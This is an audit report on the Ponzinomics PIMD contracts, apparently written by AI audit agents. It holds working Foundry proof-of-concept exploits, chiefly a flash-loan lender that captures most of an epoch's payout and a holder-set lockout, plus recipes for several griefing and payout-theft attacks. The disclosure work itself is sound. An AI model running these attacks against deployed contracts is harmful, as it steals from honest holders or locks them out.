# Audit report

> Audit the three Ponzinomics contracts in src/pimd at this commit. PimdToken is a fixed-supply ERC-20: exactly 1,000,000,000 at 18 decimals, minted once in the constructor, no owner, no mint and no burn function (burning is a plain transfer to DEAD, so totalSupply never moves). PimdHook is a Uniswap V4 hook that taxes every trade in IMD, 2.4% on buys and 5.6% on sells with the pool's own 1.25% on top, split 75% to holders and 25% to the team, taking its fees as ERC-6909 claims on the quote currency. The IMD launch factory constructs the hook and opens the pool itself, so the team wallet, the engine address, the quote token and the opening tick (129,000, tolerance 300) are all source constants. PimdEngine pushes the holders' IMD into wallets weighted by balance times hold-streak, the tiers being zero under an hour and then 0.5x, 1x, 1.5x, 2x and 3x from fourteen days; tally weighs the whole set in one call and pay is paged. This commit answers your three mediums and your finding 7 from the audit over 0fc1ff2: flush no longer tips the engine, a full holder set now reclaims a dead slot instead of locking everyone out for ever, bind excludes the launch factory and register refuses precompiles, and the holder bound is 800 under a constructor ceiling of 900. Check each of those actually closes what you found, and say whether any of them opened something new -- the reclaim path in particular, which is permissionless and removes an entry. The rest of the holder-set logic is still only one audit old. Four things in particular. First, register probes an address with _isPool but can only see the code that is there at the time, so it now records a vettedCodeless bit and tally calls _shapeChanged, which takes all weight off an address once code arrives where there was none. Say whether that really closes the play of picking a CREATE2 address, funding it, registering it while it is still empty, letting the streak mature and only then deploying pair code into it, and whether it can be evaded from the other side by an address that carries code from the start. Second, _shapeChanged is blunt on purpose: any code arriving voids the verdict, a legitimate EIP-7702 delegation included, and prune drops a holder on that same test so the address can register again on what it now is. Confirm there is no reachable state in which a holder earns nothing and cannot be pruned, because the engine has no owner and that would be permanent. Third, prune now drops a holder on its shape as well as its size and is permissionless: confirm it cannot be aimed at a holder who should keep earning, and that the swap-and-pop is still right when the pruned holder is the last element. Fourth, the exclusion list at bind is the token, imd, the hook, the PoolManager, the engine, the team, address(0) and DEAD, plus whatever the binder names. Say whether anything else can hold PIMD, be registered, and then be unable to forward an IMD payout. Then the standing ones. Tally weighs the whole set in one call against min(bal, lastBal) so a single bag cannot be counted once per wallet it is moved through, which was the high you found last time: confirm it holds. The engine must never read holder weights while the PoolManager is unlocked, which is where a flash borrower would stand. One holder who cannot receive IMD must not be able to stall a batch. beforeRemoveLiquidity is the whole safety case for letting the launch factory hold the liquidity position: it must refuse every negative liquidityDelta for ever, from any caller including the position's owner and the hook itself, while allowing a zero delta so the pool's own fee collection still works. beforeAddLiquidity must allow exactly one add, the factory's seed, and refuse every later one, reentrancy and the hook calling itself included. beforeInitialize is the only gate on the pool's shape: confirm it cannot be bypassed and that every assumption the tax maths makes is enforced there, in particular that IMD is currency0. And the fee accounting: claims minted in beforeSwap and afterSwap must always equal holdersOwed plus teamOwed, with nothing double counted or stranded, and flush must not be able to pay out more than was taken. The engine pulls from the hook inside a try/catch, which has hidden one breakage from us already: say whether that pattern is safe here. Report findings rather than fixing them, and do not propose changes to the economics, the tax rates, the split or the tier ladder.

| | |
|---|---|
| Repository | https://github.com/JJ-ME55/Ponzinomics.git |
| Commit | `f182e9f82a1abaf59d99e044e98ca420491ff560` |
| Job | `9c13704f-d886-4b4e-80ed-c711d1c4c683` |
| Judged | 2026-10-08 16:08 UTC |
| Findings | 1 high · 1 medium · 6 low · 3 info |

Four agents audited the code as it is at `f182e9f`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. High: min(bal, lastBal) is satisfied by a bag borrowed at two consecutive attacker-run tallies, so a flash loan from outside V4 is weighed in full

`src/pimd/PimdEngine.sol:435`

```
            uint256 eff = bal < last ? bal : last;
            h.lastBal = uint128(bal);
```

The H1 fix weighs each holder on min(bal, lastBal) and the NatSpec on tally says a bag not already there at the previous tally carries no weight. lastBal is written from the live balance by tally itself (line 436) and by register (line 305), fire/tally/pay are permissionless and can run in one transaction once minInterval (2 minutes) has passed, and _requireLocked only sees a borrow taken inside the V4 PoolManager. So an attacker who runs two consecutive epochs with a borrowed bag in the registered wallet for the length of each call is present at both reads: the first tally writes lastBal = loan, the second weighs min(loan, loan). The streak is blended toward the first loan epoch, so the weight is 0x for an hour and 0.5x after that, but with a loan several times the honest registered supply 0.5x is already most of every drip. To keep lastBal and the streak the attacker must run every epoch (any tally that sees bal < lastBal resets both), which it does by firing at every minInterval boundary so the keeper's fire hits TooSoon; a keeper that lands first costs the attacker a restart, not the capital. Precondition: a source of PIMD to borrow outside the V4 pool (a V2 pair flash swap, a money market, or the attacker's own pooled capital, which then earns LP fees elsewhere and the full drip, defeating the purpose of _isPool). None exists at launch, but nothing prevents one. The whole-set tally still stops one bag being counted once per wallet within a single tally; that property holds. What does not hold is the documented claim that a borrowed bag carries no weight. Merged from audit_economics (its reproduction confirmed; its path 1, register-time credit with no intervening tally, is a special case that keeper epochs in production would reset, so the two-consecutive-epochs path is the one reported). A fix cannot come from balance snapshots at attacker-chosen instants: either the read instant must leave the attacker's control (a restricted tally with abortEpoch as the liveness hatch) or holding time must be tracked where transfers happen. Both are design decisions, reported not proposed.

**Reproduction**

Engine with minBalance 100,000 PIMD, 4% drip per 15 minutes, 2 minute floor, pot seeded with 1,000 IMD. alice holds 1,000,000 PIMD, registered; attacker wallet B holds exactly 100,000 PIMD, registered; a lender contract holds 50,000,000 PIMD. Warp 15 days and run one honest keeper epoch (both at 3x). Then, one hour later, the lender transfers its bag to B, calls fire, tally, pay, and B transfers it back, all in one call; two hours after that the lender does the same again. Expected per the tally NatSpec: in the second epoch B is paid at most what a 100,000 bag can earn against alice's 1,000,000 at the same tier, 8.16 IMD of an 89.7 IMD quote. Actual: B receives 79.33 IMD (88% of the epoch) while holding 100,000 PIMD before and after, and the loan is back with the lender. forge test --match-path test/scratch/BorrowedWeight.t.sol fails with 79325227679612169070 > 8155773408736173310.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";
import {PimdEngine} from "src/pimd/PimdEngine.sol";
import {PimdToken} from "src/pimd/PimdToken.sol";

/// Stand-in for IMD: a plain 18-decimal ERC-20.
contract MockIMD is ERC20("Identity.md", "IMD", 18) {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// Stand-in for the PoolManager: the engine only reads its transient unlock flag, which is never set here.
/// A loan taken anywhere other than inside the V4 PoolManager is exactly what this test stages.
contract FakePoolManager {
    function exttload(bytes32) external pure returns (bytes32) {
        return bytes32(0);
    }
}

/// Stand-in for the hook: answers exactly what `bind` and `fire` ask of it, and holds nothing.
contract FakeHook {
    address public engine;
    address public quote;
    address public token;
    address public poolManager;
    address public launchFactory = address(0xFAC);
    uint256 public holdersOwed;

    constructor(address engine_, address quote_, address token_, address pm_) {
        engine = engine_;
        quote = quote_;
        token = token_;
        poolManager = pm_;
    }

    function flush() external pure returns (uint256, uint256) {
        return (0, 0);
    }

    function flushHolders() external pure returns (uint256) {
        return 0;
    }
}

/// A flash borrower outside Uniswap V4: holds a bag, lends it to `taker` for the length of one call that
/// runs a whole epoch, and takes it back before returning. Every engine call is wrapped so that a fix which
/// refuses the attacker's calls (a keeper-only tally, say) turns the attack into a no-op rather than a revert.
contract Lender {
    PimdEngine immutable engine;
    PimdToken immutable token;

    constructor(PimdEngine e, PimdToken t) {
        engine = e;
        token = t;
    }

    function lendAcrossAnEpoch(address taker) external {
        uint256 loan = token.balanceOf(address(this));
        token.transfer(taker, loan);
        try engine.fire() {} catch {}
        if (engine.phase() == PimdEngine.Phase.Tally) {
            try engine.tally(type(uint256).max) {} catch {}
        }
        if (engine.phase() == PimdEngine.Phase.Pay) {
            try engine.pay(type(uint256).max) {} catch {}
        }
        Taker(taker).giveBack(address(this), loan);
    }
}

/// The attacker's registered wallet. Holds exactly the minimum bag of its own between epochs.
contract Taker {
    PimdToken immutable token;

    constructor(PimdToken t) {
        token = t;
    }

    function giveBack(address to, uint256 amount) external {
        token.transfer(to, amount);
    }
}

/// `tally` weighs on min(bal, lastBal) so that "a bag that was not already there at the previous tally
/// carries no weight". But lastBal is written by tally itself, and fire/tally/pay are permissionless, so a
/// bag borrowed for the length of two attacker-run epochs is present at both reads and is weighed in full at
/// the second one. The attacker's own capital between epochs is one minimum bag.
contract BorrowedWeightTest is Test {
    uint256 constant MIN = 100_000e18;

    PimdEngine engine;
    PimdToken token;
    MockIMD imd;
    FakePoolManager pm;
    FakeHook hook;
    Lender lender;
    Taker taker;

    address alice = address(0xA11CE);
    address keeper = address(0x4EE7);

    function setUp() public {
        pm = new FakePoolManager();
        imd = new MockIMD();
        token = new PimdToken(); // the whole supply lands here
        engine = new PimdEngine(
            PimdEngine.Config({
                poolManager: address(pm),
                imd: address(imd),
                team: address(0x7EA),
                binder: address(this),
                dripBpsPerPeriod: 400,
                minInterval: 2 minutes,
                minBalance: MIN,
                fireTip: 0.02e18,
                tipPerHolder: 0.0005e18,
                maxCatchup: 6 hours,
                maxHolders: 800
            })
        );
        hook = new FakeHook(address(engine), address(imd), address(token), address(pm));
        engine.bind(address(token), address(hook), new address[](0));

        // the holders' pot: 1,000 IMD
        imd.mint(address(this), 1_000e18);
        imd.approve(address(engine), type(uint256).max);
        engine.seed(1_000e18);

        lender = new Lender(engine, token);
        taker = new Taker(token);
    }

    function _register(address who) internal {
        address[] memory a = new address[](1);
        a[0] = who;
        engine.register(a);
    }

    function _keeperEpoch() internal {
        vm.startPrank(keeper, keeper);
        engine.fire();
        if (engine.phase() == PimdEngine.Phase.Tally) engine.tally(type(uint256).max);
        if (engine.phase() == PimdEngine.Phase.Pay) engine.pay(type(uint256).max);
        vm.stopPrank();
    }

    function test_a_bag_borrowed_at_two_consecutive_tallies_is_weighed_in_full() public {
        // alice is an honest holder of 1,000,000 PIMD. The attacker's wallet holds exactly the minimum.
        uint256 aliceBag = 1_000_000e18;
        token.transfer(alice, aliceBag);
        token.transfer(address(taker), MIN);
        _register(alice);
        _register(address(taker));
        // the lender's bag is 50x alice's. It sits outside every registered wallet between epochs.
        uint256 loan = 50_000_000e18;
        token.transfer(address(lender), loan);

        // both holders mature to the top of the ladder on an honest keeper cadence
        vm.warp(vm.getBlockTimestamp() + 15 days);
        _keeperEpoch();
        assertEq(uint8(engine.phase()), uint8(PimdEngine.Phase.Idle), "the honest epoch completed");

        // the attacker runs two consecutive epochs with the loan in the wallet for the length of each call:
        // the first tally writes lastBal = loan, the second is weighed on min(loan, loan).
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        lender.lendAcrossAnEpoch(address(taker));
        uint256 before = imd.balanceOf(address(taker));
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        uint256 quote = engine.dripPreview();
        lender.lendAcrossAnEpoch(address(taker));
        uint256 got = imd.balanceOf(address(taker)) - before;

        // between epochs the attacker holds only the minimum, and the loan is back with the lender
        assertEq(token.balanceOf(address(taker)), MIN, "the attacker's own bag is the minimum");
        assertEq(token.balanceOf(address(lender)), loan, "the loan went back");

        // the most a wallet that owns the minimum bag can honestly take from that epoch: its bag at the top
        // tier against alice's bag at the top tier
        uint256 honestCeiling = (quote * (MIN * 3)) / (MIN * 3 + aliceBag * 3);
        assertLe(
            got,
            (honestCeiling * 101) / 100,
            "a bag borrowed for the length of the epoch call was weighed in full: the attacker was paid as a holder of the loan"
        );
    }
}
```

### 2. Medium: Reclaim cursor is rolled back by the HolderSetFull revert, so register only ever probes the same eight entries and a dead slot behind a live head is never reclaimed

`src/pimd/PimdEngine.sol:298`

```
            if (holders.length >= maxHolders && !_reclaimSlot()) revert HolderSetFull(maxHolders);
```

_reclaimSlot probes RECLAIM_PROBES (8) entries from reclaimCursor, writes reclaimCursor = c on a miss (line 670) and returns false; its NatSpec says the cursor persists so repeated calls sweep the set. Its only caller is register, which on false immediately reverts HolderSetFull, and the revert undoes the cursor write. The cursor therefore moves only on a successful reclaim, to the index just refilled. Against a full set register examines the eight entries at the current cursor and nothing else, for ever: if those eight hold at least minBalance and have grown no code, every call reverts identically no matter how many dead entries sit behind them. The fix for finding 2 of the previous audit therefore holds only when a dead entry happens to sit within eight positions of the cursor. An attacker who registers eight minimum bags first (8,000,000 PIMD at the production minimum, about 20 IMD at the opening tick) and pads the rest of the set by walking one bag re-creates the lockout the fix was written for, and the same shape arises with no attacker when the first eight registrants are long-term holders and a dead entry sits anywhere later. The residual escape is a manual prune of a specific dead address by someone who has enumerated the set off chain, which is the two-transaction, front-runnable state the atomic reclaim was meant to replace; nothing in the HolderSetFull revert says a prune would help. On the brief's question whether the reclaim path opened anything new: what it removes is sound (same test as prune, Idle-only, _removeAt is correct including when the evicted entry is the last element, and the registrant cannot be its own evictee because an index1 != 0 address is skipped first); it simply does not deliver the sweep the commit and the NatSpec claim. Merged from audit_permissions, audit_math and audit_flow, which report the same mechanism. Fixing it needs the cursor write to survive a miss (skip the account instead of reverting, or move the sweep into a non-reverting path) or a sweep that covers the whole bounded set; no revert can carry a storage write.

**Reproduction**

Engine with maxHolders 10 and minBalance 100,000 PIMD (the live 800 behaves the same with the dead entry at index 8 or later). Register eight live holders at indices 0..7, each on its own minimum bag. Walk one bag through ghost0 and ghost1, registering each (indices 8 and 9), then move the bag out: the set is full, both ghosts hold 0, reclaimCursor is 0. Give the bag to an honest address and call register([honest]) up to three times. Expected per the NatSpec: attempt 1 probes 0..7 and persists cursor = 8, attempt 2 probes index 8, evicts ghost0 and registers honest. Actual: every attempt reverts HolderSetFull(10), reclaimCursor() stays 0, honest is never registered. forge test --match-path test/scratch/ReclaimCursor.t.sol fails on this code and passes when the revert at line 298 is replaced by continue (verified by mutation).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";
import {PimdEngine} from "src/pimd/PimdEngine.sol";
import {PimdToken} from "src/pimd/PimdToken.sol";

/// Stand-in for IMD: a plain 18-decimal ERC-20.
contract MockIMD is ERC20("Identity.md", "IMD", 18) {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// Stand-in for the PoolManager: the engine only reads its transient unlock flag, which is never set here.
contract FakePoolManager {
    function exttload(bytes32) external pure returns (bytes32) {
        return bytes32(0);
    }
}

/// Stand-in for the hook: answers exactly what `bind` and `fire` ask of it, and holds nothing.
contract FakeHook {
    address public engine;
    address public quote;
    address public token;
    address public poolManager;
    address public launchFactory = address(0xFAC);
    uint256 public holdersOwed;

    constructor(address engine_, address quote_, address token_, address pm_) {
        engine = engine_;
        quote = quote_;
        token = token_;
        poolManager = pm_;
    }

    function flush() external pure returns (uint256, uint256) {
        return (0, 0);
    }

    function flushHolders() external pure returns (uint256) {
        return 0;
    }
}

/// The reclaim sweep that was written to close "a walked bag locks the holder set for ever" never moves its
/// cursor on a miss: `_reclaimSlot` writes `reclaimCursor = c` and returns false, and `register` then reverts
/// HolderSetFull, which undoes that write. So `register` against a full set only ever examines the eight
/// entries at the current cursor. Eight live entries at the head and a dead entry anywhere behind them is a
/// set that `register` can never reclaim, however many times it is called.
contract ReclaimCursorTest is Test {
    uint256 constant MIN = 100_000e18;
    uint256 constant MAX_HOLDERS = 10;

    PimdEngine engine;
    PimdToken token;
    MockIMD imd;
    FakePoolManager pm;
    FakeHook hook;

    function setUp() public {
        pm = new FakePoolManager();
        imd = new MockIMD();
        token = new PimdToken(); // the whole supply lands here
        engine = new PimdEngine(
            PimdEngine.Config({
                poolManager: address(pm),
                imd: address(imd),
                team: address(0x7EA),
                binder: address(this),
                dripBpsPerPeriod: 400,
                minInterval: 2 minutes,
                minBalance: MIN,
                fireTip: 0.02e18,
                tipPerHolder: 0.0005e18,
                maxCatchup: 6 hours,
                maxHolders: MAX_HOLDERS
            })
        );
        hook = new FakeHook(address(engine), address(imd), address(token), address(pm));
        engine.bind(address(token), address(hook), new address[](0));
    }

    function _register(address who) internal returns (bool ok) {
        address[] memory a = new address[](1);
        a[0] = who;
        (ok,) = address(engine).call(abi.encodeCall(engine.register, (a)));
    }

    function _registered(address who) internal view returns (bool r) {
        (r,,,,) = engine.holderInfo(who);
    }

    function test_register_never_reclaims_a_dead_slot_behind_a_live_head() public {
        // eight live holders fill indices 0..7, each on its own minimum bag
        for (uint256 i; i < 8; ++i) {
            address live = address(uint160(0x1000 + i));
            token.transfer(live, MIN);
            assertTrue(_register(live), "live holder registers");
        }
        // one bag walked through two fresh addresses fills indices 8 and 9; both are left holding nothing
        address ghost0 = address(0xDEAD00);
        address ghost1 = address(0xDEAD01);
        token.transfer(ghost0, MIN);
        assertTrue(_register(ghost0), "ghost0 registers");
        vm.prank(ghost0);
        token.transfer(ghost1, MIN);
        assertTrue(_register(ghost1), "ghost1 registers");
        vm.prank(ghost1);
        token.transfer(address(this), MIN);
        assertEq(engine.holderCount(), MAX_HOLDERS, "the set is full");
        assertLt(token.balanceOf(ghost0), MIN, "ghost0 is dead");
        assertLt(token.balanceOf(ghost1), MIN, "ghost1 is dead");
        assertEq(engine.reclaimCursor(), 0, "cursor at the head");

        // an honest holder with a real bag tries to get in. The NatSpec on _reclaimSlot promises that the
        // cursor persists so repeated calls sweep the set: the first call probes 0..7 and moves the cursor to
        // 8, the second finds ghost0 at index 8. Three attempts is more than enough under that promise.
        address honest = address(0xB0B);
        token.transfer(honest, MIN);
        for (uint256 attempt; attempt < 3 && !_registered(honest); ++attempt) {
            _register(honest); // a revert here is HolderSetFull; the sweep is supposed to make the next one succeed
        }
        assertTrue(_registered(honest), "three register attempts never reclaimed either dead slot behind the live head");
        assertEq(engine.holderCount(), MAX_HOLDERS, "and the set is still bounded");
    }
}
```

### 3. Low: _isPool is self-reported: a contract with code from the start can answer the engine differently, or turn pair-shaped later, and tally never re-examines it

`src/pimd/PimdEngine.sol:693`

```
        return _probe(a, IPairLike.token0.selector) == t || _probe(a, IPairLike.token1.selector) == t;
```

Answer to the brief's first question. The CREATE2 play is closed: an address vetted codeless loses all weight in the first tally after code lands (_shapeChanged at line 438) and prune and _reclaimSlot drop it on the same test, so unmodified pair code deployed into a pre-registered empty address earns nothing from that epoch on. It is evaded from the other side. An address that has code at register gets vettedCodeless = false for good, so _shapeChanged can never fire, and the only pool test it ever faces is _isPool: a staticcall it answers itself. Two shapes, both reproduced: (a) a contract whose token0() returns PIMD to every caller except the engine (msg.sender is visible in a staticcall) registers, is weighed and paid every epoch, and prune re-asks the same liar the same question so it can never be removed while its bag stays above the minimum; (b) a contract whose token0() answer is mutable (a storage slot, a proxy) registers while not pair-shaped, becomes pair-shaped without new code, and keeps full weight every epoch until somebody notices and calls prune. Any pooled-PIMD contract without the token0/token1 selectors (a Curve-style pool, a vault, a bonding curve) is in the same class as (a). The guarantee the NatSpec gives is against unmodified V2/V3 pair code, which cannot do either; the launch material should not claim more than that. Merged from audit_permissions, audit_math, audit_economics and audit_flow, which report the same mechanism with different example contracts. No code-level fix closes (a); re-probing in tally was rejected for gas reasons already stated in the source. Reported, not proposed.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. (a) Deploy LyingPair whose token0() returns PIMD unless msg.sender == engine, in which case 0xBEEF; token1() returns 0xdead. Transfer 1,000,000 PIMD to it, register([pair]): expected skipped, actual registered. Warp 2 days, fire/tally/pay: the pair receives 29,487,906,066,015,158 wei IMD. prune([pair]) leaves it registered. (b) Deploy MutablePair with token0 = 0xdead and a setter; fund and register it (accepted); warp 2 days; set token0 = PIMD; run an epoch: it is paid as a pair. Both in test/scratch/Leads.t.sol (test_a_pair_that_lies_to_the_engine_registers_is_paid_and_is_never_prunable, test_a_contract_that_turns_pair_shaped_without_new_code_keeps_earning_until_pruned), both pass, i.e. both behaviours reproduce.

### 4. Low: Any keyless or sweep-less address at or above 0x100 can be funded, registered by a stranger and paid for ever, stranding its share of every drip

`src/pimd/PimdEngine.sol:287`

```
            if (uint160(a) < PRECOMPILE_CEILING) continue;
```

Answer to the brief's fourth question. The bind exclusion list (token, IMD, hook, launch factory, PoolManager, engine, team, address(0), DEAD, plus alsoExclude) and the precompile ceiling cover the addresses the launch itself puts PIMD into and the 256 addresses below 0x100. The class is open-ended: address(0x100) itself, vanity burn addresses, any CREATE2 address never deployed to, and any contract with no ERC-20 sweep (WETH, Permit2, another token contract, the test router). A stranger sends minBalance PIMD to one and calls register. It is codeless or not pair-shaped so _isPool passes it; no code ever arrives so _shapeChanged never fires; its balance never falls so neither prune nor _reclaimSlot can remove it; and IMD's plain transfer to it succeeds, so _send reports success and the IMD is gone rather than returned to the pot. From fourteen days on it earns at 3x on its bag and dilutes every honest holder by its share, and excluded is write-once so nothing can be done after bind. Nobody profits and the griefer loses the bag (0.1% of supply per entry at the production minimum), which is why this is low. It is recorded because the precompile exclusion reads as if it closes the keyless case, and because the only full mitigations change the delivery model (pull-based claims or self-registration). Merged from audit_math and audit_economics.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. Register alice on a bought bag. Transfer 1,000,000 PIMD to address(0x100) and call register([0x100]): expected refused like a precompile, actual registered. Warp 15 days, fire/tally/pay: imd.balanceOf(0x100) == 29,487,906,066,015,158 wei and nothing can move it. prune([0x100]) leaves it registered. test/scratch/Leads.t.sol::test_a_keyless_address_above_the_precompile_ceiling_registers_and_strands_drips passes, i.e. the behaviour reproduces.

### 5. Low: A stranger can void a counterfactual smart-account holder's matured streak by deploying the account through its public factory, then prune it

`src/pimd/PimdEngine.sol:682`

```
        return h.vettedCodeless && a.code.length != 0;
```

Answer to the brief's second question. There is no reachable state in which a holder earns nothing and cannot be pruned: _shapeChanged is the same test in tally, prune and _reclaimSlot, so whatever it zeroes it also lets out, and a wallet that later clears a 7702 delegation goes back to a plain shape with vettedCodeless false and keeps earning. That part is confirmed. The bluntness has a cost the NatSpec does not mention: it assumes only the holder can make code arrive at their address. For a counterfactual smart-account address that is false. ERC-4337 account factories expose createAccount(owner, salt) to anyone and the account lands at the address the owner has been funding, so a holder who received PIMD at a not-yet-deployed account, registered it and matured a 3x streak can have the streak taken by a stranger who pays the deployment gas: the next tally weighs them at zero, the stranger prunes them, and re-registration starts the clock from zero with vettedCodeless false. The holder loses up to fourteen days of maturation per address; no funds move; attacker cost is gas. Reported from audit_permissions and confirmed. A fix that keeps the blunt check would key the shape test on code hash rather than code presence, or not restart the clock on re-registration after a shape-only removal; both are design choices.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. AccountFactory.predict(owner, salt) gives W with no code. Transfer 1,000,000 PIMD to W, register([W]), register alice too, warp 15 days: holderInfo(W).tierBps == 30000. A stranger calls factory.deploy(owner, salt); W now has code. Run an epoch: imd.balanceOf(W) == 0. The stranger calls prune([W]): W is unregistered. register([W]) again: registered with tierBps == 0. test/scratch/Leads.t.sol::test_a_stranger_can_void_a_counterfactual_wallets_streak passes, i.e. the behaviour reproduces.

### 6. Low: tally still pays tipPerHolder on the tw == 0 path and fire's tip stands, so a null epoch moves IMD from the pot to the caller while totalDripped stays 0

`src/pimd/PimdEngine.sol:455`

```
        _tip(tipPerHolder * (end - start));
```

The M4 fix stops fire arming a tip budget and paying fireTip when drip == 0 or the set is empty. The symmetric case was not closed: when the set is non-empty but every holder weighs zero, fire arms tipBudget (5% of the drip) and pays fireTip, tally returns epochQuote to the pot and goes Idle, and then still pays tipPerHolder times the entries walked. Nothing was distributed, EpochPaid is not emitted and totalDripped does not move, yet up to 5% of that cycle's drip left the pot, and fire can be called again after minInterval. tw == 0 for the whole set is reachable with no attacker in the first hour after the first registrations (every tier is 0x under an hour), and with one: a set padded with ghost entries below minBalance weighs zero and still pays tipPerHolder per ghost walked, 2.4 IMD for 800 at the production value, bounded only by the 5% budget of each cycle. Bounded and non-compounding, so a leak rather than a drain, but it is the case M4 was meant to close. Merged from audit_permissions, audit_math and audit_flow. The minimal change that keeps the tip policy is to skip _tip on the tw == 0 branch, mirroring fire.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol (fireTip 0.02 IMD, tipPerHolder 0.0005 IMD). alice buys 500 IMD of PIMD and registers. Warp 30 minutes (inside her first hour). keeper calls fire then tally(1). Phase goes Tally then Idle, totalDripped() == 0, epochQuote() == 0 (returned to the pot). Expected if tips reward distribution: keeper's IMD balance unchanged. Actual: keeper's IMD balance rises by 20,500,000,000,000,000 wei (fire tip plus one tally tip) out of the pot. test/scratch/Leads.t.sol::test_a_null_epoch_still_pays_tips_out_of_the_pot passes, i.e. the behaviour reproduces.

### 7. Low: The 900 constructor ceiling is measured in the cheapest tally state; with every balance changed since the last tally 900 holders cost 33.3M gas and cannot be weighed under the 32M ArbOS limit

`src/pimd/PimdEngine.sol:194`

```
        if (c.maxHolders == 0 || c.maxHolders > 900) revert BadConfig();
```

The comment above this line, the deploy script and test_the_holder_bound_fits_the_chains_per_transaction_budget all use 34.6k gas per weighed holder, measured by Gas.t.sol with every balance unchanged since registration, where the lastBal/streakStart slot is rewritten with the same value (100 gas). In a traded market balances change between tallies, which makes that write a nonzero-to-nonzero SSTORE (2,900 gas) and the streak blend runs. Measured on this code with every holder's balance changed since the last write: 38.0k per holder at 100 holders, 37.0k at 800 and 900 once the fixed overhead is amortised; 800 holders cost 29.6M (92.5% of 32M) and 900 cost 33.3M, which cannot execute. So the ceiling that exists so that an unweighable set cannot be configured admits one, and with no owner and prune only able to drop dead or pool-shaped entries an engine deployed at 900 would cycle fire, tally-reverts, abortEpoch for ever once full. The launch value of 800 does fit today, so this is a margin error rather than a live failure; the comment, the script and the ceiling should carry the changed-balance number. Reported from audit_flow and confirmed by measurement.

**Reproduction**

Engine with maxHolders n, minBalance 100,000 PIMD. Register n holders each holding minBalance + 1 PIMD, then transfer 1 PIMD more to each so every balance differs from the lastBal written at registration; warp 2 days; fire; measure tally(n) with gasleft(). Actual: n=100 unchanged 3,456,897 (34,568 per holder, matching Gas.t.sol); n=100 changed 3,802,297 (38,022); n=800 changed 29,609,769; n=900 changed 33,296,705 > 32,000,000. The same figures under forge test --isolate. test/scratch/GasWorst.t.sol prints them.

### 8. Low: bind excludes the engine's team immutable but never checks or excludes the hook's team(), so a deploy where TEAM_MULTISIG differs from PimdHook.TEAM_WALLET leaves the wallet the hook pays registrable

`src/pimd/PimdEngine.sol:249`

```
            team,
```

The engine's team immutable is used in exactly one place, the exclusion list at bind. The hook carries its own copy as TEAM_WALLET and that is the address that receives 25% of every tax. bind validates the hook's engine(), quote(), token(), poolManager() and launchFactory() against the engine's configuration precisely because bind is one-shot and a mismatch would be unrecoverable, but IPimdHookLike does not declare team() and nothing compares the two. The deploy script takes the engine's team from TEAM_MULTISIG with no assertion that it equals the hook constant. If they differ, the wallet that actually receives the team's IMD can hold PIMD and be registered by anyone, which test_team_is_excluded_from_drips says must not happen, while an address that receives nothing is excluded instead. Exclusion is write-once so it cannot be corrected afterwards. The wallet can forward IMD so nothing is stranded; the effect is that the team farms the holders' pot, against the stated policy that the team never holds PIMD. Merged from audit_permissions and audit_flow. The one-line fix is to require h.team() == team at bind, or add h.team() to the exclusion list.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. Deploy a second engine with team = X. Deploy a second harness hook with engine = that engine and team() = Y, Y != X, open its pool through the factory, bind. excluded(X) is true, excluded(Y) is false. Transfer 1,000,000 PIMD to Y and call register([Y]): holderInfo(Y).registered is true. test/scratch/Leads.t.sol::test_the_hooks_team_wallet_is_not_excluded_when_it_differs_from_the_engines passes, i.e. the behaviour reproduces.

### 9. Info: totalToTeam and the Flushed event book the pre-tip team slice, overstating what the team received by every outside caller's tip

`src/pimd/PimdHook.sol:451`

```
        totalToTeam += toTeam;
```

On the engine's path the tip is zero and the commit's test asserts totalToTeam == owedTeam there, where it happens to be exact. On every other flush tip = min(callerTip, 20% of toTeam) goes to msg.sender and the team receives toTeam - tip, but totalToTeam += toTeam and Flushed(msg.sender, toHolders, toTeam, tip) both book the full slice as paid to the team. There is no tips counter, so the lifetime stat the site reads drifts from the team wallet's balance by the sum of all outside tips. Accounting only; no IMD moves wrongly. From audit_math, confirmed. Fix: book toTeam - tip, or add a tips counter.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. alice buys 100 IMD of PIMD: teamOwed = 0.6 IMD. keeper calls flush(). Expected: totalToTeam equals what the team wallet received. Actual: totalToTeam() == 600,000,000,000,000,000 while the team's IMD balance rose by 590,000,000,000,000,000 and the keeper's by 10,000,000,000,000,000. test/scratch/Leads.t.sol::test_totalToTeam_counts_the_caller_tip passes, i.e. the behaviour reproduces.

### 10. Info: A sale restarts the streak only if it is still visible at the next tally; selling and buying back the same amount inside one epoch window keeps the tier, contrary to the NatSpec and README

`src/pimd/PimdEngine.sol:427`

```
                h.streakStart = uint64(nowTs); // sold or sent out: the clock restarts
```

The token has no transfer hook, so the engine can only compare the balance at this tally with lastBal from the previous one. A holder who sells and buys back at least the same amount before the next tally shows bal >= lastBal: equal keeps streakStart untouched, larger blends it by size, and neither restarts it. The NatSpec on tally says selling 'still restarts the streak immediately' and the README says selling restarts the streak; between two tallies (15 minutes at the keeper's cadence, 2 minutes at the floor) neither is true. Weight is still bounded by min(bal, lastBal) so nothing is over-counted; this is a documentation mismatch, recorded from audit_flow so the stated economics match the code, not a proposal to change them.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. alice buys 100 IMD of PIMD, registers, warps 15 days and an epoch runs: tierBps == 30000. She sells half her bag to the pool, then buys back exactly the amount sold with an exact-out buy, all before the next tally. 15 minutes later an epoch runs. Expected per the documentation: tierBps == 0 for an hour. Actual: tierBps == 30000. test/scratch/Leads.t.sol::test_a_sale_undone_before_the_next_tally_keeps_the_tier passes, i.e. the behaviour reproduces.

